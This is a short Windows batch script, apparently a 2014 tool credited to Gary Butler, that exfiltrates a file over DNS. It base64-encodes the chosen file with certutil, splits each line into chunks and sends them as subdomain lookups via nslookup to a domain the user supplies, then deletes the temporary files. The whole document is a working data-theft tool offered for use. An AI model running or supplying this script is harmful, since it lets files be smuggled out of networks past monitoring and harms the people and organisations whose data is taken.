echo off
setlocal enableextensions
setlocal enabledelayedexpansion
echo DNSExfil(tration) 
echo Gary Butler - 25 April 2014
REM TODO: input validation. If no arguments submitted at command line, then prompt for inputs.
REM TODO: If the first half of base64 string is less than 32 chars in length, you must do '-1' as in the latter half and not do the latter half.
echo.
echo use: $filepath $domain
echo.

for /F %%I in ("%1") do @set file=%%~nI
echo Transmitting: %file%
echo.
certutil -encode "%1" "%userprofile%\Desktop\%file%.2" 1>NUL
pause
cd "%userprofile%\Desktop"
findstr /V CERTIFICATE  "%file%.2" > "%file%.3"
for /F "tokens=*" %%i in (%file%.3) do @set var=%%i && echo nslookup -type=A -timeout=1 !var:~0,31!.%2 &&  nslookup -type=A -timeout=1 !var:~31,-1!.%2
pause
del "%file%.2"
del "%file%.3"

endlocal